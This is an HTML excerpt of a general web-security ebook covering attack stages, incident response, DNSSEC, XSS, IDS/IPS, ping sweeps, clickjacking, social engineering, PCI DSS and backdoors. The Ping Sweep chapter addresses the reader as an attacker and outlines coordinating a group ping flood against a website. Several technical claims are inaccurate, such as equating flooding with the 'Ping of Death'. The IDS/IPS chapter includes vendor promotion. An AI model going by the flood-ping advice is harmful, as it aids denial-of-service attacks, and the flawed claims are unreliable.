+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-a">A</span> cyber-attack, just</span> like any other ambitious endeavor, must be planned carefully and executed precisely for it to be successful. According to industry research, advanced attacks remain inside organizations’ systems for an average of 200 days before they are discovered. If you think of it, that is a long time. All this while, an attacker is gathering data, mapping the network, and monitoring communications. If you understand the steps that attackers take to successfully carry out an attack, from their point of view, then you can either prevent it from happening to your organization or reduce the time it takes to discover it. Reconnaissance means checking out something before acting. Hackers start by identifying a weak target and they then come up with the best way to exploit it. They learn the structure of the organization, look for any weak link employees, and decide whether to attack a third party or the company website.  Anyone can be the initial target. All the attackers need is a single point of entry. Once the hackers have identified a target, they look for a weak point that will give them access. They do this by checking the organization’s network using tools from the internet known as scanning. This process can take some time. Access and Escalation will take place once they have identified the vulnerabilities in the network, they access it and move through it without being detected. In situations like these, they need privileged access so that they can move freely. Tools such as rainbow tables help hackers steal credentials and give them admin privileges. They can then access any system through the administrator’s account. With the elevated privileges, the intruders have basically taken over and now “own” the network. With the ability to move freely around the network, hackers can access the most sensitive data in an organization’s system and extract it. They may not only be interested in stealing private data—if they want, they can delete or change files. Their next step is to remain in the network quietly. They may decide to install rootkits and other malicious programs that allow them to come back as often as they want. Now that they have elevated privileges, they are not relying on a single point of entry. Every cyber-attack will not have an assault mode. In this stage, things can get very ugly. The intruders may change the functionality of the hardware or even disable it completely. In this step, the attackers may not be quiet any more. Sometimes, hackers will want to cover their tracks while other times, they can decide to leave a calling card. A trail obfuscation is meant to disorientate, confuse, and divert the process of forensic examination. Some of the tools and techniques covered in trail obfuscation include Trojan commands, zombie accounts, backbone hopping, misinformation, spoofing, and log cleaners. About 97% of organizations have been compromised at least once, according to Mandiant. The most effective defense against a cyber-attack is to control privileged access.</p>
+<p><span id="c011.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 7</h1>
+<h1>Incident Response</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-a">A</span>n incident, in web</span> application security, is the attempted violation or violation of the security policies of an application. Altering a site’s content, data theft, unauthorized access attempts, vulnerability exploits and network breaches are good examples. Incident response is the mitigation or prevention of such threats. Enterprises come up with an organized approach to help them improve their network defenses and block security breaches.</p>
+<p>This is achieved by:</p>
+<div class="blockquote">
+<p>●  Figuring out the weak spots of an application.</p>
+<p>●  Enhancing security parameters against threats.</p>
+<p>●  Safeguarding the access to all the sensitive parts/data of an application.</p>
+</div>
+<p>Even when an attempt is unsuccessful, it is still wise to treat it as an incident.</p>
+<p>Web application firewalls (WAFs) are a very important part of incident response strategies. It is helpful to understand how they are used so that you can come up with an efficient incident response policy. This lifecycle can be divided into three phases: there is the preparation phase, the detection/analysis phase, and post incident activity. In each phase, WAF technology has a different role to play. The Preparation Phase is a two-part process. It involves putting in place security configurations and testing the application for any weaknesses. There are several steps you can take to prepare for a threat while still protecting the sensitive areas of your application: Deploying a WAF: a WAF conducts an analysis of incoming traffic and blocks all attempts of an attack aimed at the application layers. Some WAFs will even protect your application from zero-day attacks. Setting up access control policies: this is where the parts of your application and website containing sensitive information are identified and secured.  This is done using 2FA (two-factor authentication). It offers extra access control. Security orchestration: this involves developing a cohesive work flow by streamlining security measures. For example, redefining the tasks and roles of each security team member. Testing for Weaknesses, you test your application, usually using a pen test, to see if there are any soft spots that an intruder can exploit. Adjustments are then made to patch the identified soft spots. Once deployed, security measures analyze and filter all the incoming web traffic. If any incident is detected, they block malicious requests, raise an alarm, and document all the details concerning the threat in a comprehensive security log known as incident detection analysis.</p>
+<p>The log includes:</p>
+<div class="poetry">
+<p>●  The geolocation and IP data of the perpetrator.</p>
+<p>●  The attack vectors</p>
+<p>●  The HTTP fingerprint of the intruder</p>
+<p>●  The attempt entry page.</p>
+</div>
+<p>When you have a detailed description of the security event, you can understand it and come up with an appropriate response. Post-Incident Activity is the last phase of the entire process and it is devoted to using the lessons learned in the other phases. It has three parts including:</p>
+<div class="blockquote">
+<p>●  Reviewing the logs to figure out whether the incident unraveled any soft spots.</p>
+<p>●  Changing WAF rules and coming up with new policies to remove weaknesses.</p>
+<p>●  Testing out the new rules.</p>
+</div>
+<p>Rinse and Repeat is a continual process. Every incident is a learning opportunity. It will help you improve your enterprise’s security and enhance your preparedness.</p>
+<p><span id="c012.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 8</h1>
+<h1>DNSSEC</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-i">I</span>t is a suite of extensions</span> that enhance DNS (Domain Name System) security by confirming that the results have not been compromised. DNSSEC can help enterprises reinforce their DNS security. DNS spoofing is a good example of an attack on the infrastructure of DNS. A perpetrator hijacks the cache of a DNS resolver. When users visit that website, they receive the wrong IP address and view the malicious site of the attacker instead of the legitimate site. Organizations can use DNSSEC to protect definitions and sensitive data in their DNS server. Host information, mail exchange server details, and IP addresses are examples of data found in the DNS. DNSSEC protects this data. It can also block data exfiltration done via DNS. DNSSEC tries to make sure that replies sent to clients by name servers are authentic. This is done with digital signature technology. Cryptographic signatures are added to DNS records hence protecting the information published in the DNS. DNSSEC defines new resource record types for DNS to enhance digital signature validation. Resource record signature has cryptographic signature for a specific record set. DNSKEY record has a public key which is used in the authentication process of the DNS. The DNS namespace can be divided into several zones in a process called DNS delegation. A DS (delegation signer) is a fingerprint of the public DNSKEY. It is kept in the parent zone. NSEC (next secure record) uses the DNSSEC sorting order to bring up the next valid record name. Consequently, a DNS resolver can disprove the existence of a DNS record. NSEC3 overcomes the NSEC-walking potential by hashing all record names cryptographically in a zone.</p>
+<p>NSEC3 Parameter (NSEC3PARAM)</p>
+<p>It provides the DNS server with parameters to determine the NSEC3 records that will be included in responses to DNSSEC requests for names that do not exist. DNSSEC can verify DNS requests and is, therefore, useful for reducing DNS spoofing risks. It does not, however, address DDoS (Distributed Denial of Service) attacks that leverage DNS servers. As a matter of fact, it can amplify the effect of the attack. DNSSEC has additional cryptographic information and fields to verify records, so the replies sent for DNS questions are larger here. Large responses make it possible for the perpetrator to gain much more attack volume.</p>
+<p>DNSSEC Validation Process</p>
+<p>These are the stages of a DNSSEC validation process: A user enters a URL address. The browse queries the DNS resolver of the local computer to determine the hostname IP address. If the IP address is in the resolver cache, it gives feedback to the browser. If it is not found, the request is passed to a recursive resolver. If this one has the address, it returns it. If not, a recursive query is started to identify the DNS server holding the requested domain authoritative information. The root DNS server is contacted first and refers the resolver to the TLD (top-level domain) DNS server for that domain. The resolver will then be referred by the TLD DNS to an authoritative name server. In all stages, the resolver will request the DNSSEC key associated with the DNS zone. This is to verify the authenticity of the server. The resolver will validate the RRSIG and confirm that it was not tampered with in transit.</p>
+<p><span id="c013.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 9</h1>
+<h1>Reflected Cross Site Scripting (XSS) Attacks</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-a">A</span> web application susceptibility</span> that allows an intruder to inject code into an outside website’s contents is what is referred to as a cross-site scripting (XSS). When someone visits the infected page on that website the code is executed in their browser. Because of this, the intruder bypasses the “same origin policy” of the browser and can access private information from the victim. A Reflected XSS attack, also called a non-persistent attack. It occurs when a malevolent script reflects off a web app to a victim’s browser. The script is activated using a link. A request with a vulnerability is send to a website and this enables malicious scripts to be executed. This vulnerability is usually caused by not sanitizing incoming requests sufficiently which opens the web application’s functions to manipulation. An attacker embeds the malicious link into a third-party website or an email to distribute it. The link prompts the user to click on it and this initiates the XSS request.  Reflected attacks differ from stored attacks in that, the latter requires the attacker to look for a website that will allow for the injection of the malevolent script while with a reflected attack, the script is embedded on a link. For this incident to be successful, the user must click on the link.</p>
+<p>Stored and reflected XSS attacks have some differences:</p>
+<div class="poetry">
+<p>●  Reflected attacks are far more common</p>
+<p>●  Vigilant users can avoid reflected attacks</p>
+<p>●  The two don’t have the same reach</p>
+</div>
+<p>The attacker in a XSS attack plays a number game. He sends the link to thousands of users to increase his chances of success. Even if a very small fraction of the users decides to click on the link, he will still have a good number of infected forum users. These users will be directed to the forum’s website and the malevolent script will reflect on their browser. Consequently, the perpetrator can hijack their accounts by stealing their session cookies. You can prevent and mitigate an XSS attack in several ways. First, for users, being vigilant is the best defense against XSS scripting. To be specific, users should avoid clicking on any suspicious links because you never know which one contains a malicious code. You can find suspicious links in:</p>
+<div class="poetry">
+<p>●  Social media feed</p>
+<p>●  Emails send by unknown contacts</p>
+<p>●  The comment section of a website</p>
+</div>
+<p>A website operator should also protect their users from potential abuse.</p>
+<p>Web application firewalls (WAFs) go a long way in preventing reflected XSS attacks. They can block abnormal requests where input sanitization is lacking. In a stored attack, the malicious request of a perpetrator to a site is blocked while in a reflected attack, the request of the user is blocked. This protects the user and collateral damage (other website users). Some web application firewalls counter reflected XSS attacks using signature filtering. These WAFs use crowdsourcing technology to automatically collect attack data from an entire network.</p>
+<p><span id="c014.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 10</h1>
+<h1>Intrusion Detection and Intrusion Prevention</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-i">I</span>ntrusion detection</span> and intrusion prevention are both broad terms. They describe practices in application security that are used to reduce attacks and prevent new threats. Detection is a reactive measure. It identifies and neutralizes ongoing attacks with an intrusion detection system. It weeds out existing malware and checks social engineering assaults. Intrusion is proactive. It uses intrusion prevention systems to block application attacks preemptively. An IDS is a software application or a hardware device that detects and analyzes outbound and inbound network traffic using known intrusion signatures to check for abnormal activities.</p>
+<p>This is achieved through:</p>
+<div class="poetry">
+<p>●  Comparing system files against malware signatures</p>
+<p>●  Detecting signs of harmful patterns by scanning processes</p>
+<p>●  Detecting malicious intent by monitoring user behavior</p>
+<p>●  Monitoring system configurations and settings</p>
+</div>
+<p>When a security policy violation, configuration error or a virus is detected, an IDS can get the offender off the network and inform security personnel of the incident. An IDS has immense benefits including attack detection and network traffic analysis. However, it has its downside. It may not detect newly discovered threats because it only uses known intrusion signatures. Moreover, an IDS does not detect incoming assaults, only ongoing attacks. An intrusion prevention system, therefore, is necessary. An IPS (Intrusion Prevention) inspects the incoming traffic of a system and removes any malicious requests. A regular IPS configuration utilizes traffic filtering solutions and web application firewalls to secure applications. It drops malicious packets, blocks malevolent IPs, and informs security personnel of any potential threats. Because systems like these use an already existing database for signature recognition, they can be programmed to identify attacks based on behavioral and traffic anomalies. IPS systems are very efficient when it comes to blocking attack vectors, but they still have limitations. They rely too much on predefined rules and are, therefore, vulnerable to false positives. Imperva cloud WAF solutions are totally customizable tools. They block any security threats and reduce false positives. Here are some of Imperva cloud WAF IPS features: WAF (web application firewall): this cloud-based firewall is placed on the edge of your network. It will secure your existing IPS using signature, behavioral and reputational heuristics to filter application attacks and malicious incoming requests. There are advanced features such as application-aware technologies, dynamic profiling and access control to mitigate false positives. Custom rules: Imperva cloud WAF capabilities are expanded to allow you to apply your own access control and security policies. Customization is useful in mitigating false positives and removing any hidden threats that are unique to your organization.</p>
+<p>Two-factor authentication (2FA): 2FA requires users to go through two means/steps of verification when they are logging into a system such as a one-time passcode (OTP) and a password. This extra layer of protection protects sensitive data. Backdoor protection: since IDS configurations rely on known malware signatures to identify backdoors, it is a halfway measure. Perpetrators can easily avoid recognition.  Backdoor Protection from Imperva solves this problem fully.</p>
+<p><span id="c015.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 11</h1>
+<h1>Ping Sweep</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-p">P</span>ing is the network</span>-based utility of a system used to know whether a host is dead or alive. Technically, it is called an echo reply. The term “alive” here means that the host (website, network, system, computer, etc.) is active. The term “dead” means that it is in shutdown mode. Note: a host can be anything such as a network, printer, computer system, website, or any other device.  So, what is a Ping sweep? It is a technique of gathering information that is used to identify the hosts that are alive by pinging them. To go into more technical details: A Ping sweep can also be referred to as a two-way handshake protocol, an ICMP sweep (Internet Control Message Protocol) or a Ping scan. A host sends packets (data), another host validates it and returns feedback (packets, again) confirming whether the ping was successful—that is why it is called a two-way handshake protocol. There are several purposes for which a Ping sweep can be used: After identifying the host’s IP address, you can ping the address to know whether the host is dead or alive. If the packets are correctly received, then you know that the host is alive, and you can continue with your attack on the victim (the host). There are so many tools available for a regular Ping sweep such as Nmap, gping and fping. You can also do it directly on Linux and Windows platforms using looping shell script. To do it on Windows, go to Start &gt; Run &gt; CMD. Next, type PING 127.0.0.1 (host’s IP address). Flood Pinging is a type of denial attack. It is done by flooding many pings to a host or a website. The result of this is that a legitimate or normal user will be unable to access that website since every host (victim network or website) has a maximum capacity limit. Flood Pinging goes beyond that limit and jams the network. The host will then stop responding. Flood Pinging is done by creating automated scripts or with the use of a flood Pinging software. Sometimes flood Pinging is referred to as the Ping of Death because when it is carried out, it causes the host to act like a dead host. Note: this can only be successful if the bandwidth of the attacker is more than that of the host. Doing this in groups, however, can do the trick. Generally, not many website owners have unlimited bandwidth plans because they are too expensive. They opt, instead, for other plans (like 10GB bandwidth). If you try to flood Ping from a 2 or 4 Mbps connection, you will not be successful. If you do it with a group of, say 20 people, you may succeed. Launching the attack from 20 computers at the same time, each with a 2 Mbps connection will see your host get hit with 40 Mbps. Is this possible when the bandwidth of the host is 10GB? Hackers usually create many connections from one PC, and this is enough to slow down the database and functionality of the website.</p>
+<p><span id="c016.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 12</h1>
+<h1>Clickjacking</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-c">C</span>lickjacking is a cyber</span>-attack in which the victim is tricked into clicking an invisible web element or one that is represented as another element. The victim can then unknowingly download malware, give sensitive information/credentials, visit malicious pages, buy products online, or transfer money.  Usually, in a clickjacking attack, an invisible HTML element or page is displayed within an iframe at the top of the user’s current web page. The user clicks on it thinking it is the visible page while, in fact, it is an invisible element. The invisible page may be a page that the victim had no intention to visit or a malicious page. Clickjacking attacks occur in several forms such as: likejacking: a trick that manipulates the Facebook “Like” button, causing people to like pages that they did not mean to like. Cursor jacking: a technique in which the position of the cursor is changed. This attack used to rely on susceptibilities in Firefox and Flash—which have since been fixed.</p>
+<p>Clickjacking Attack Example</p>
+<div class="blockquote">
+<p>●  The perpetrator builds and enticing page where the user is promised a free trip to Hawaii. The attacker checks in the background to see whether the victim is logged onto their banking site. If they are logged on, the perpetrator loads the page that allows for funds transfer and then uses query parameters to fill his bank credentials into the form. The money transfer page is placed in an invisible iframe at the top of the gift page. The “Confirm Transfer” button is aligned exactly on top of the “Receive Gift “button.  The victim goes to the page an innocently clicks on “Book My Free Trip” button. What the user does not know is that they are clicking on a hidden frame and they just clicked on “Confirm Transfer” and they unknowingly send money to the perpetrator. The victim is again redirected to a web page with details about the gift. They still have no idea what just happened.  There are two main ways to prevent a clickjacking attack: Client-side methods: Frame Busting is the most common here. Client-side methods are effective sometimes, but they can be bypassed easily so they are not the best. Server-side methods: X-Frame-Options is the most common. Security experts recommend these methods. Reducing Clickjacking with X-Frame-Options Response Header This one method indicates whether a browser has permission to have a page inside a &lt;IFRAME&gt; or &lt;FRAME&gt; tag.  The X-Frames-Options header allows three values: DENY: no domain can display an image within a frame. SAMEORIGIN: a page can be displayed in a frame on other pages if they are within the current domain. ALLOW-FROM URI: an in-frame display of the current page is only allowed in a specific URI.</p>
+</div>
+<p>Limitations of X-Frame-Options</p>
+<div class="poetry">
+<p>●  The SAMEORIGIN option does not allow for cross-site application.</p>
+<p>●  You cannot create whitelist of allowed domains.</p>
+<p>●  You cannot use several options on a single page.</p>
+<p>●  Not all browsers support the ALLOW-FROM option.</p>
+<p>●  Most browsers have deprecated the X-Frame-Options</p>
+</div>
+<p><span id="c017.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 13</h1>
+<h1>Social Engineering</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-s">S</span>ocial engineering</span> refers to malicious attacks carried out via human interactions. These attacks manipulate the victim psychologically, causing them to give sensitive information or make a security mistake. A social engineering attack can happen in multiple steps or just one. The attacker researches the target victim to get background information. Next, he/she tries to win the trust of the victim and encourages them to take a subsequent action that compromises sensitive information.  Social engineering attacks are dangerous because instead of relying on weaknesses in an operating system or software, they rely on human error.  There are many types of social engineering attacks and they can be carried out anywhere if there is human interaction. However, some forms are more common than others and here are five of the well-known ones: Baiting attacks prey on a victim’s curiosity or greed. The perpetrator lures the victim into a trap, giving them the ability to install malware or steal sensitive information. Physical media is widely used in this kind of social engineering attack. A malicious hacker may leave a flash drive infected with malware as bait in a conspicuous area such as parking lot, bathroom, elevator, etc. As soon as the victim inserts the drive into a home or work computer, the system becomes infected. Scareware is also known as fraudware, rogue scanner software, and deception software. It slaps victims with fictitious threats and false alarms. The attacker leads the user to think that their system has malware. He then prompts the victim to install a (fake) anti-malware software. This software is usually malware. Scareware attacks are usually presented in the form of a genuine-looking popup in a browser informing you of a possible virus in your system. They can also arrive via spam emails. Pretexting is when a perpetrator uses lies to gather information. He asks for sensitive information from the victim by impersonating tax officials, a bank, a co-worker, or the police. In most cases, he will ask questions prompting you to confirm your identity. A lot of personal information can be stolen using this tactic, such as phone records, phone numbers, and social security numbers. Phishing is a very popular kind of social engineering attack. A phishing scam is a text message or email campaign that tries to create a sense of fear, curiosity, or urgency in the victim. The victims are then tricked into clicking on malicious links, opening malware-laden attachment, or giving sensitive information. Spear Phishing a type of phishing scam but it is usually targeted. The perpetrator chooses certain enterprises or individuals. He then crafts a very specific message based on the victim’s contacts, job position, or characteristics. He impersonates his victim and tricks their co-workers or contacts into giving sensitive information.</p>
+<p>Social Engineering Prevention</p>
+<div class="poetry">
+<p>●  Have anti malware or antivirus software and keep it updated.</p>
+<p>●  Do not accept tempting offers.</p>
+<p>●  Consider using multi-factor authentication.</p>
+<p>●  Do not open suspicious emails or attachments.</p>
+</div>
+<p><span id="c018.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 14</h1>
+<h1>PCI DSS</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-t">T</span>he PCI DSS (Payment</span> Card Industry Data Security Standard) is a series of security standards created by American Express, JCB International, Discover Financial Services, MasterCard, and Visa in 2004. The compliance scheme is governed by the PCI SSS (Security Standard Council) and its goal is to protect debit card and credit card transactions from fraud and data theft. The PCI SSC cannot legally compel compliance but all businesses that process debit or credit card transactions are required to have PCI certification. PCI certification safeguards your business’ card data using requirements formed by the PCI SSC. Some of the requirements are well-known practices such as:</p>
+<div class="poetry">
+<p>●  Using anti-virus software</p>
+<p>●  Encryption of data transmissions</p>
+<p>●  Firewalls installation</p>
+</div>
+<p>Moreover, businesses are required to restrict access to the data of a cardholder and monitor all access to the network resources. When your business is PCI compliant, customers are assured that their information is safe. Besides, the reputational and monetary cost of noncompliance is enough to make any business treat data security with importance.  There are four levels of PCI compliance depending on the number of debit or credit card transactions per year. This classification determines what is required of an enterprise. Level 1: this is for merchants processing over 6 million card transactions in a year. An annual internal audit is a must and it should be carried out by a PCI auditor. They must also submit to a PCI scan once a quarter by an ASV (Approved Scanning Vendor).  Level 2: this is for businesses processing between 1 million and 6 million card transactions in a year. An assessment using a Self-Assessment Questionnaire (SAQ) is required of them every once in a year. A PCI scan every quarter may also be necessary. Level 3: this is for businesses processing between 20,000 and 1 million transactions annually. A yearly assessment is a must, using the appropriate SAQ. They may be subject to a quarterly PCI scan. Level 4: this is for businesses processing not more than 20,000 card transactions in a year. An annual SAQ assessment is required. They may also be subject to a quarterly PCI scan. There are 12 requirements by the PCI SSC that should be adhered to when dealing with cardholder data. They are distributed over six larger goals. An enterprise must fulfill them to become compliant.</p>
+<p>Secure Network</p>
+<div class="poetry">
+<p>●  A firewall configuration must put in place and maintained.</p>
+<p>●  System passwords should not be vendor-supplied but original.</p>
+</div>
+<p>Secure Cardholder Data</p>
+<div class="blockquote">
+<p>●  Protect stored cardholder data.</p>
+<p>●  Encrypt transmissions of cardholder information across all public networks.</p>
+</div>
+<p>Vulnerability Management</p>
+<div class="poetry">
+<p>●  Use anti-virus software and update it regularly.</p>
+<p>●  Develop and maintain secure applications and systems.</p>
+</div>
+<p>Access Control</p>
+<div class="poetry">
+<p>●  Access to cardholder data must be restricted.</p>
+<p>●  Staff with computer access should be given a unique ID.</p>
+<p>●  Restriction of physical access to the data of a cardholder.</p>
+</div>
+<p>Network Monitoring and Testing</p>
+<div class="poetry">
+<p>●  Monitor access to network resources and cardholder data.</p>
+<p>●  Regularly test security processes and systems.</p>
+</div>
+<p>Information Security</p>
+<div class="poetry">
+<p>●  Maintain a policy that deals with information security. </p>
+</div>
+<p><span id="c019.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 15</h1>
+<h1>Backdoor Attacks</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-a">A</span> backdoor attack is</span> a type of malware that bypasses the normal process of authentication to access a network. Consequently, remote access to resources in the application is granted. Once this is done, the perpetrator can issue system commands remotely and even update malware. Attackers achieve backdoor installation by taking advantage of any susceptible areas in a web application. After it is installed, it is difficult to detect since files are highly concealed in most cases. Web Server backdoor can be used for all kinds of malicious activities such as:</p>
+<div class="poetry">
+<p>●  Server hijacking</p>
+<p>●  Advanced persistent threat assaults</p>
+<p>●  Infecting web visitors</p>
+<p>●  Launching of DDoS attacks</p>
+<p>●  Data theft</p>
+<p>●  Website defacing</p>
+</div>
+<p>Backdoors are commonly installed through remote file inclusion (RFI). This is an attack vendor that takes advantage of weaknesses in apps that reference external scripts dynamically. In an RFI situation, a backdoor A Trojan is downloaded from a remote host by the referencing function.</p>
